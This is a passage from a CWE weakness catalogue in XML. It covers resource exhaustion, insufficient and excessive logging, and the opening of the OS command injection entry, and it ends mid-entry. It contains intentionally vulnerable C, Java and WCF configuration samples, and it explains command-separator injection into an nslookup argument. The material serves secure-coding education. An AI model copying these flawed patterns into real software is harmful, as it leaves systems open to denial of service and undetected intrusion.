                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
               <Effectiveness_Notes>This will only be applicable to cases where user input can influence the size or frequency of resource allocations.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Mitigation of resource exhaustion attacks requires that the target system either:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:ul>
                        <xhtml:li>recognizes the attack and denies that user further access for a given amount of time, typically by using increasing time delays</xhtml:li>
                        <xhtml:li>uniformly throttles all requests in order to make it more difficult to consume resources more quickly than they can again be freed.</xhtml:li>
                     </xhtml:ul>
                  </xhtml:div>
                  <xhtml:p>The first of these solutions is an issue in itself though, since it may allow attackers to prevent the use of the system by a particular valid user. If the attacker impersonates the valid user, they may be able to prevent the user from accessing the server in question.</xhtml:p>
                  <xhtml:p>The second solution can be difficult to effectively institute -- and even when properly done, it does not provide a full solution. It simply requires more resources on the part of the attacker.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Ensure that protocols have specific limits of scale placed on them.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-38.1">
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>If the program must fail, ensure that it fails gracefully (fails closed). There may be a temptation to simply let the program fail poorly in cases such as low memory conditions, but an attacker may be able to assert control before the software has fully exited. Alternately, an uncontrolled failure could cause cascading problems with other downstream components; for example, the program could send a signal to a downstream process so the process immediately knows that a problem has occurred and has a better chance of recovery.</xhtml:p>
                  <xhtml:p>Ensure that all failures in resource allocation place the system into a safe posture.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-47">
               <Phase>Operation</Phase>
               <Phase>Architecture and Design</Phase>
               <Strategy>Resource Limitation</Strategy>
               <Description>
                  <xhtml:p>Use resource-limiting settings provided by the operating system or environment. For example, when managing system resources in POSIX, setrlimit() can be used to set limits for certain types of resources, and getrlimit() can determine how many resources are available. However, these functions are not available on all operating systems.</xhtml:p>
                  <xhtml:p>When the current levels get close to the maximum that is defined for the application (see CWE-770), then limit the allocation of further resources to privileged users; alternately, begin releasing resources for less-privileged users. While this mitigation may protect the system from attack, it will not necessarily stop attackers from adversely impacting other users.</xhtml:p>
                  <xhtml:p>Ensure that the application performs the appropriate error checks and error handling in case resources become unavailable (CWE-703).</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-25">
               <Intro_Text>This code allocates a socket and forks each time it receives a new connection.</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>sock=socket(AF_INET, SOCK_STREAM, 0);<xhtml:br/>while (1) {<xhtml:div style="margin-left:10px;">newsock=accept(sock, ...);<xhtml:br/>printf("A connection has been accepted\n");<xhtml:br/>pid = fork();</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The program does not track how many connections have been made, and it does not limit the number of connections. Because forking is a relatively expensive operation, an attacker would be able to cause the system to run out of CPU, processes, or memory by making a large number of connections. Alternatively, an attacker could consume all available connections, preventing others from accessing the system remotely.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-50">
               <Intro_Text>In the following example a server socket connection is used to accept a request to store data on the local file system using a specified filename. The method openSocketConnection establishes a server socket to accept requests from a client. When a client establishes a connection to this service the getNextMessage method is first used to retrieve from the socket the name of the file to store the data, the openFileToWrite method will validate the filename and open a file to write to on the local file system. The getNextMessage is then used within a while loop to continuously read data from the socket and output the data to the file until there is no longer any data from the socket.</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>int writeDataFromSocketToFile(char *host, int port)<xhtml:br/>{<xhtml:div style="margin-left:10px;">
                        <xhtml:div>
                           <xhtml:br/>char filename[FILENAME_SIZE];<xhtml:br/>char buffer[BUFFER_SIZE];<xhtml:br/>int socket = openSocketConnection(host, port);<xhtml:br/>
                           <xhtml:br/>if (socket &lt; 0) {<xhtml:div style="margin-left:10px;">printf("Unable to open socket connection");<xhtml:br/>return(FAIL);</xhtml:div>}<xhtml:br/>if (getNextMessage(socket, filename, FILENAME_SIZE) &gt; 0) {<xhtml:div style="margin-left:10px;">
                              <xhtml:div>if (openFileToWrite(filename) &gt; 0) {<xhtml:div style="margin-left:10px;">
                                    <xhtml:div>while (getNextMessage(socket, buffer, BUFFER_SIZE) &gt; 0){<xhtml:div style="margin-left:10px;">if (!(writeToFile(buffer) &gt; 0))<xhtml:div style="margin-left:10px;">break;</xhtml:div>
                                       </xhtml:div>}</xhtml:div>
                                 </xhtml:div>}<xhtml:br/>closeFile();</xhtml:div>
                           </xhtml:div>}<xhtml:br/>closeSocket(socket);</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This example creates a situation where data can be dumped to a file on the local file system without any limits on the size of the file. This could potentially exhaust file or disk resources and/or limit other clients' ability to access the service.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-51">
               <Intro_Text>In the following example, the processMessage method receives a two dimensional character array containing the message to be processed. The two-dimensional character array contains the length of the message in the first character array and the message body in the second character array. The getMessageLength method retrieves the integer value of the length from the first character array. After validating that the message length is greater than zero, the body character array pointer points to the start of the second character array of the two-dimensional character array and memory is allocated for the new body character array.</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i>/* process message accepts a two-dimensional character array of the form [length][body] containing the message to be processed */</xhtml:i>
                     <xhtml:br/>int processMessage(char **message)<xhtml:br/>{<xhtml:div style="margin-left:10px;">
                        <xhtml:div>char *body;<xhtml:br/>
                           <xhtml:br/>int length = getMessageLength(message[0]);<xhtml:br/>
                           <xhtml:br/>if (length &gt; 0) {<xhtml:div style="margin-left:10px;">body = &amp;message[1][0];<xhtml:br/>processMessageBody(body);<xhtml:br/>return(SUCCESS);</xhtml:div>}<xhtml:br/>else {<xhtml:div style="margin-left:10px;">printf("Unable to process message; invalid message length");<xhtml:br/>return(FAIL);</xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This example creates a situation where the length of the body character array can be very large and will consume excessive memory, exhausting system resources. This can be avoided by restricting the length of the second character array with a maximum length check</Body_Text>
               <Body_Text>Also, consider changing the type from 'int' to 'unsigned int', so that you are always guaranteed that the number is positive. This might not be possible if the protocol specifically requires allowing negative values, or if you cannot control the return value from getMessageLength(), but it could simplify the check to ensure the input is positive, and eliminate other errors such as signed-to-unsigned conversion errors (CWE-195) that may occur elsewhere in the code.</Body_Text>
               <Example_Code Nature="good" Language="C">
                  <xhtml:div>unsigned int length = getMessageLength(message[0]);<xhtml:br/>if ((length &gt; 0) &amp;&amp; (length &lt; MAX_LENGTH)) {...}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-52">
               <Intro_Text>In the following example, a server object creates a server socket and accepts client connections to the socket. For every client connection to the socket a separate thread object is generated using the ClientSocketThread class that handles request made by the client through the socket.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>public void acceptConnections() {<xhtml:br/>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:div>try {<xhtml:div style="margin-left:10px;">ServerSocket serverSocket = new ServerSocket(SERVER_PORT);<xhtml:br/>int counter = 0;<xhtml:br/>boolean hasConnections = true;<xhtml:br/>while (hasConnections) {<xhtml:div style="margin-left:10px;">Socket client = serverSocket.accept();<xhtml:br/>Thread t = new Thread(new ClientSocketThread(client));<xhtml:br/>t.setName(client.getInetAddress().getHostName() + ":" + counter++);<xhtml:br/>t.start();</xhtml:div>}<xhtml:br/>serverSocket.close();</xhtml:div>
                           <xhtml:br/>
                           <xhtml:br/>} catch (IOException ex) {...}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>In this example there is no limit to the number of client connections and client threads that are created. Allowing an unlimited number of client connections and threads could potentially overwhelm the system and system resources.</Body_Text>
               <Body_Text>The server should limit the number of client connections and the client threads that are created. This can be easily done by creating a thread pool object that limits the number of threads that are generated.</Body_Text>
               <Example_Code Nature="good" Language="Java">
                  <xhtml:div>public static final int SERVER_PORT = 4444;<xhtml:br/>public static final int MAX_CONNECTIONS = 10;<xhtml:br/>...<xhtml:br/>
                     <xhtml:br/>public void acceptConnections() {<xhtml:br/>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:div>try {<xhtml:div style="margin-left:10px;">ServerSocket serverSocket = new ServerSocket(SERVER_PORT);<xhtml:br/>int counter = 0;<xhtml:br/>boolean hasConnections = true;<xhtml:br/>while (hasConnections) {<xhtml:div style="margin-left:10px;">hasConnections = checkForMoreConnections();<xhtml:br/>Socket client = serverSocket.accept();<xhtml:br/>Thread t = new Thread(new ClientSocketThread(client));<xhtml:br/>t.setName(client.getInetAddress().getHostName() + ":" + counter++);<xhtml:br/>ExecutorService pool = Executors.newFixedThreadPool(MAX_CONNECTIONS);<xhtml:br/>pool.execute(t);</xhtml:div>}<xhtml:br/>serverSocket.close();</xhtml:div>
                           <xhtml:br/>
                           <xhtml:br/>} catch (IOException ex) {...}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>An unnamed web site allowed a user to purchase tickets for an event. A menu option allowed the user to purchase up to 10 tickets, but the back end did not restrict the actual number of tickets that could be purchased.</Intro_Text>
               <References>
                  <Reference External_Reference_ID="REF-667"/>
               </References>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>Here the problem is that every time a connection is made, more memory is allocated. So if one just opened up more and more connections, eventually the machine would run out of memory.</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>bar connection() {<xhtml:div style="margin-left:10px;">foo = malloc(1024);<xhtml:br/>return foo;</xhtml:div>}<xhtml:br/><xhtml:br/>endConnection(bar foo) {<xhtml:div style="margin-left:10px;">free(foo);</xhtml:div>}<xhtml:br/><xhtml:br/>int main() {<xhtml:div style="margin-left:10px;">while(1) {<xhtml:div style="margin-left:10px;">foo=connection();</xhtml:div>}<xhtml:br/><xhtml:br/>endConnection(foo)</xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2009-4017</Reference>
               <Description>Language interpreter does not restrict the number of temporary files being created when handling a MIME request with a large number of parts..</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4017</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2726</Reference>
               <Description>Driver does not use a maximum width when invoking sscanf style functions, causing stack consumption.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2726</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2540</Reference>
               <Description>Large integer value for a length property in an object causes a large amount of memory allocation.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2540</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2054</Reference>
               <Description>Product allows exhaustion of file descriptors when processing a large number of TCP packets.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2054</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5180</Reference>
               <Description>Communication product allows memory consumption with a large number of SIP requests, which cause many sessions to be created.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5180</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1700</Reference>
               <Description>Product allows attackers to cause a denial of service via a large number of directives, each of which opens a separate window.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1700</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-4650</Reference>
               <Description>CMS does not restrict the number of searches that can occur simultaneously, leading to resource exhaustion.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4650</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>FIO04-J</Entry_ID>
               <Entry_Name>Close resources when they are no longer needed</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SER12-J</Entry_ID>
               <Entry_Name>Avoid memory and resource leaks during serialization</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>MSC05-J</Entry_ID>
               <Entry_Name>Do not exhaust heap space</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="125"/>
            <Related_Attack_Pattern CAPEC_ID="130"/>
            <Related_Attack_Pattern CAPEC_ID="147"/>
            <Related_Attack_Pattern CAPEC_ID="197"/>
            <Related_Attack_Pattern CAPEC_ID="229"/>
            <Related_Attack_Pattern CAPEC_ID="230"/>
            <Related_Attack_Pattern CAPEC_ID="231"/>
            <Related_Attack_Pattern CAPEC_ID="469"/>
            <Related_Attack_Pattern CAPEC_ID="482"/>
            <Related_Attack_Pattern CAPEC_ID="486"/>
            <Related_Attack_Pattern CAPEC_ID="487"/>
            <Related_Attack_Pattern CAPEC_ID="488"/>
            <Related_Attack_Pattern CAPEC_ID="489"/>
            <Related_Attack_Pattern CAPEC_ID="490"/>
            <Related_Attack_Pattern CAPEC_ID="491"/>
            <Related_Attack_Pattern CAPEC_ID="493"/>
            <Related_Attack_Pattern CAPEC_ID="494"/>
            <Related_Attack_Pattern CAPEC_ID="495"/>
            <Related_Attack_Pattern CAPEC_ID="496"/>
            <Related_Attack_Pattern CAPEC_ID="528"/>
            <Related_Attack_Pattern CAPEC_ID="82"/>
            <Related_Attack_Pattern CAPEC_ID="99"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-386"/>
            <Reference External_Reference_ID="REF-387"/>
            <Reference External_Reference_ID="REF-388"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 17, &#34;Protecting Against Denial of Service Attacks&#34; Page 517"/>
            <Reference External_Reference_ID="REF-672"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 10, &#34;Resource Limits&#34;, Page 574"/>
         </References>
         <Notes>
            <Note Type="Maintenance">"Resource exhaustion" (CWE-400) is currently treated as a weakness, although it is more like a category of weaknesses that all have the same type of consequence. While this entry treats CWE-400 as a parent in view 1000, the relationship is probably more appropriately described as a chain.</Note>
            <Note Type="Theoretical">Vulnerability theory is largely about how behaviors and resources interact. "Resource exhaustion" can be regarded as either a consequence or an attack, depending on the perspective. This entry is an attempt to reflect one of the underlying weaknesses that enable these attacks (or consequences) to take place.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="778" Name="Insufficient Logging" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>When a security-critical event occurs, the software either does not record the event or omits important details about the event when logging it.</Description>
         <Extended_Description>When security-critical events are not logged properly, such as a failed login attempt, this can make malicious behavior more difficult to detect and may hinder forensic analysis after an attack succeeds.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="223" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="223" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Operation</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Non-Repudiation</Scope>
               <Impact>Hide Activities</Impact>
               <Note>If security critical information is not recorded, there will be no trail for forensic analysis and discovering the cause of problems or the source of attacks may become more difficult or impossible.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Use a centralized logging mechanism that supports multiple levels of detail. Ensure that all security-related successes and failures can be logged.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Operation</Phase>
               <Description>Be sure to set the level of logging appropriately in a production environment. Sufficient data should be logged to enable system administrators to detect attacks, diagnose errors, and recover from attacks. At the same time, logging too much data (CWE-779) can cause the same problems.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The example below shows a configuration for the service security audit feature in the Windows Communication Foundation (WCF).</Intro_Text>
               <Example_Code Nature="bad" Language="XML">
                  <xhtml:div>&lt;system.serviceModel&gt;<xhtml:div style="margin-left:10px;">&lt;behaviors&gt;<xhtml:div style="margin-left:10px;">&lt;serviceBehaviors&gt;<xhtml:div style="margin-left:10px;">&lt;behavior name="NewBehavior"&gt;<xhtml:div style="margin-left:10px;">&lt;serviceSecurityAudit auditLogLocation="Default"<xhtml:br/>suppressAuditFailure="false"<xhtml:br/>serviceAuthorizationAuditLevel="None"<xhtml:br/>messageAuthenticationAuditLevel="None" /&gt;</xhtml:div>
                              <xhtml:br/>...<xhtml:br/>
                           </xhtml:div>
                        </xhtml:div>
                     </xhtml:div>&lt;/system.serviceModel&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The previous configuration file has effectively disabled the recording of security-critical events, which would force the administrator to look to other sources during debug or recovery efforts.</Body_Text>
               <Body_Text>Logging failed authentication attempts can warn administrators of potential brute force attacks. Similarly, logging successful authentication events can provide a useful audit trail when a legitimate account is compromised. The following configuration shows appropriate settings, assuming that the site does not have excessive traffic, which could fill the logs if there are a large number of success or failure events (CWE-779).</Body_Text>
               <Example_Code Nature="good" Language="XML">
                  <xhtml:div>&lt;system.serviceModel&gt;<xhtml:div style="margin-left:10px;">&lt;behaviors&gt;<xhtml:div style="margin-left:10px;">&lt;serviceBehaviors&gt;<xhtml:div style="margin-left:10px;">&lt;behavior name="NewBehavior"&gt;<xhtml:div style="margin-left:10px;">&lt;serviceSecurityAudit auditLogLocation="Default"<xhtml:br/>suppressAuditFailure="false"<xhtml:br/>serviceAuthorizationAuditLevel="SuccessAndFailure"<xhtml:br/>messageAuthenticationAuditLevel="SuccessAndFailure" /&gt;</xhtml:div>
                              <xhtml:br/>...<xhtml:br/>
                           </xhtml:div>
                        </xhtml:div>
                     </xhtml:div>&lt;/system.serviceModel&gt;</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2008-4315</Reference>
               <Description>server does not log failed authentication attempts, making it easier for attackers to perform brute force password guessing without being detected</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4315</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1203</Reference>
               <Description>admin interface does not log failed authentication attempts, making it easier for attackers to perform brute force password guessing without being detected</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1203</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-3730</Reference>
               <Description>default configuration for POP server does not log source IP or username for login attempts</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-3730</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-1225</Reference>
               <Description>proxy does not log requests without "http://" in the URL, allowing web surfers to access restricted web content without detection</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1225</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-1566</Reference>
               <Description>web server does not log requests for a non-standard request type</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1566</Link>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Accountability&#34;, Page 40"/>
         </References>
         
      </Weakness>
      <Weakness ID="779" Name="Logging of Excessive Data" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software logs too much information, making log files hard to process and possibly hindering recovery efforts or forensic analysis after an attack.</Description>
         <Extended_Description>While logging is a good practice in general, and very high levels of logging are appropriate for debugging stages of development, too much logging in a production environment might hinder a system administrator's ability to detect anomalous conditions. This can provide cover for an attacker while attempting to penetrate a system, clutter the audit trail for forensic analysis, or make it more difficult to debug problems in a production environment.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="400" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="400" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Operation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Low</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Resource Consumption (CPU)</Impact>
               <Impact>DoS: Resource Consumption (Other)</Impact>
               <Note>Log files can become so large that they consume excessive resources, such as disk and CPU, which can hinder the performance of the system.</Note>
            </Consequence>
            <Consequence>
               <Scope>Non-Repudiation</Scope>
               <Impact>Hide Activities</Impact>
               <Note>Logging too much information can make the log files of less use to forensics analysts and developers when trying to diagnose a problem or recover from an attack.</Note>
            </Consequence>
            <Consequence>
               <Scope>Non-Repudiation</Scope>
               <Impact>Hide Activities</Impact>
               <Note>If system administrators are unable to effectively process log files, attempted attacks may go undetected, possibly leading to eventual system compromise.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Suppress large numbers of duplicate log messages and replace them with periodic summaries. For example, syslog may include an entry that states "last message repeated X times" when recording repeated events.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Support a maximum size for the log file that can be controlled by the administrator. If the maximum size is reached, the admin should be notified. Also, consider reducing functionality of the software. This may result in a denial-of-service to legitimate software users, but it will prevent the software from adversely impacting the entire system.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Adjust configurations appropriately when software is transitioned from a debug state to production.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2007-0421</Reference>
               <Description>server records a large amount of data to the server log when it receives malformed headers</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0421</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1154</Reference>
               <Description>chain: application does not restrict access to front-end for updates, which allows attacker to fill the error log</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1154</Link>
            </Observed_Example>
         </Observed_Examples>
         
      </Weakness>
      <Weakness ID="78" Name="Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component.</Description>
         <Extended_Description>
            <xhtml:p>This could allow attackers to execute unexpected, dangerous commands directly on the operating system. This weakness can lead to a vulnerability in environments in which the attacker does not have direct access to the operating system, such as in web applications. Alternately, if the weakness occurs in a privileged program, it could allow the attacker to specify commands that normally would not be accessible, or to call alternate commands with privileges that the attacker does not have. The problem is exacerbated if the compromised process does not follow the principle of least privilege, because the attacker-controlled commands may run with special system privileges that increases the amount of damage.</xhtml:p>
            <xhtml:p>There are at least two subtypes of OS command injection:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:ol>
                  <xhtml:li>The application intends to execute a single, fixed program that is under its own control. It intends to use externally-supplied inputs as arguments to that program. For example, the program might use system("nslookup [HOSTNAME]") to run nslookup and allow the user to supply a HOSTNAME, which is used as an argument. Attackers cannot prevent nslookup from executing. However, if the program does not remove command separators from the HOSTNAME argument, attackers could place the separators into the arguments, which allows them to execute their own program after nslookup has finished executing.</xhtml:li>
                  <xhtml:li>The application accepts an input that it uses to fully select which program to run, as well as which commands to use. The application simply redirects this entire command to the operating system. For example, the program might use "exec([COMMAND])" to execute the [COMMAND] that was supplied by the user. If the COMMAND is under attacker control, then the attacker can execute arbitrary commands or programs. If the command is being executed using functions like exec() and CreateProcess(), the attacker might not be able to combine multiple commands together in the same line.</xhtml:li>
               </xhtml:ol>
            </xhtml:div>
            <xhtml:p>From a weakness standpoint, these variants represent distinct programmer errors. In the first variant, the programmer clearly intends that input from untrusted parties will be part of the arguments in the command to be executed. In the second variant, the programmer does not intend for the command to be accessible to any untrusted party, but the programmer probably has not accounted for alternate ways in which malicious attackers can provide input.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="77" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="77" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="CanAlsoBe" CWE_ID="88" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Shell injection</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Shell metacharacters</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Scope>Non-Repudiation</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Impact>Read Files or Directories</Impact>
               <Impact>Modify Files or Directories</Impact>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Impact>Hide Activities</Impact>
               <Note>Attackers could execute unauthorized commands, which could then be used to disable the software, or read and modify data for which the attacker does not have permissions to access directly. Since the targeted application is directly executing the commands instead of the attacker, any malicious activities may appear to come from the application or the application's owner.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-1">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.</xhtml:p>
                  <xhtml:p>Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes.</xhtml:p>
                  <xhtml:p>Automated static analysis might not be able to detect the usage of custom API functions or third-party libraries that indirectly invoke OS commands, leading to false negatives - especially if the API/library code is not available for analysis.</xhtml:p>
               </Description>
               <Effectiveness_Notes>This is not a perfect solution, since 100% accuracy and coverage are not feasible.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-2">
               <Method>Automated Dynamic Analysis</Method>
               <Description>This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</Description>
               <Effectiveness>Moderate</Effectiveness>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-10">
               <Method>Manual Static Analysis</Method>
               <Description>Since this weakness does not typically appear frequently within a single software package, manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all potentially-vulnerable operations can be assessed within limited time constraints.</Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
